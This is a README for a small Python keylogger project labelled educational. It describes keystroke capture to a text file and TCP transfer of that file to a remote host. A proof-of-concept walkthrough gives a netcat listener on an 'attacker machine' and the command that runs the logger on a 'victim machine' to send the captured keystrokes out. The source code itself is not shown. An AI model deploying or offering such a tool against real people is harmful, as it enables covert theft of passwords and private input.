<div align="center">
    <img src="./.assets/imgs/kylog-logo.png" alt="logo" width=600 heigth=149>
</div>

</br>

<div align="center">
    <h4>Simple and lightweight keylogger made with Python</h4>
</div>

This project is a **simple keylogger written in python for educational purposes**. It captures keystrokes from the keyboard, saves the captured words into a text file (`output.txt`), and optionally sends the file to a remote machine over network.

## Features

### Capture printable keystrokes

The program uses the `keyboard` library to detect and record any printable characters typed by the user. Special keys like `Shift` and `Ctrl` are ignored, focusing only on characters that form meaningful input.

### Detects and processes words

When the user types, characters are accumulated into a `word` variable. Once the space key is pressed, the word is saved into a text file (`output.txt`) and the variable is reset, allowing the program to efficiently handle word-by-word input.

### Stores data in a file

The captured words are stored in a file named `output.txt`. This file is created in the same directory as the script if it does not already exist. Data is appended to the file to ensure that no information is lost between sessions.

### Sends capture data toa remote machine

Upon termination of the program (by pressing `ESC`), the `output.txt` file is transmitted to a specified remote machine using TCP sockets. The IP address and port of the receiving machine can be dynamically set using command-line arguments.

### Customizable IP address and port

The program accepts the IP address and port of the remote machine as command-line arguments, making it adaptable to different network configurations and scenarios.

## Setup

### Clone the repository

Clone this repository to your local machine:

```bash
git clone https://github.com/sporestudio/kylog
cd kylog
```

### Install requirements

#### Create virtual environment

Create a virtual environment to install the requirements for the project (optional but recommended):

```bash
python3 -m venv kylog
source kylog/bin/activate
```

Install the requirements:

```bash
pip install -r requirements.txt
```

## POC

<div align="center">
    <img src="./.assets/imgs/kylog-diagram.png" alt="logo" width=600 heigth=149>
</div>

|      Machine      |       IP        |
|-------------------|-----------------|
|  Atacker Machine  |   192.168.1.97  |
|  Victim Machine   |   192.168.1.66  |


In this proof of concept we have two machines, an attacker machine and a victim machine (infected with kylog), so we will run the keylogger on the victim machine, we will capture the keystrokes and when we press ESC, we will send these keystrokes by TCP to the attacker machine. 

### Setup the attacker machine

<img src=".assets/imgs/attacker.png" alt="img" align="right" width="400px">

On the machine that will recive the captured data:

- Start listening for incoming connections with `netcat`:

```bash
nc -lvnp <port>
```

- Example:

```bash
nc -lvnp 4444
```

### Run the keylogger in the victim machine

<img src=".assets/imgs/victim.png" alt="img" align="left" width="400px">

On the victim machine running the keylogger, execute the script with the IP address and port of the receiver machine:

```bash
python3 src/kylog.py <ip_address> <port>
```

- Example:

In our case, we want to send the `output.txt` file to **192.168.1.97** address via *4444* port.

```bash
python3 src/kylog.py 192.168.1.97 4444
```

### Stop the keylogger

To stop the keylogger, press the `ESC` key. This will trigger the script to send the captured `output.txt` file to the receiver machine using the IP and port specified earlier.

## License

This project is under <a href="https://github.com/sporestudio/dns-server/blob/main/LICENSE">GNU General Public License v3.0</a>


## Contributions

Contributions are welcome! Feel free to fork the repository, submit issues, or create pull requests.


## Author

Created by <a href="https://github.com/sporestudio">sporestudio</a>.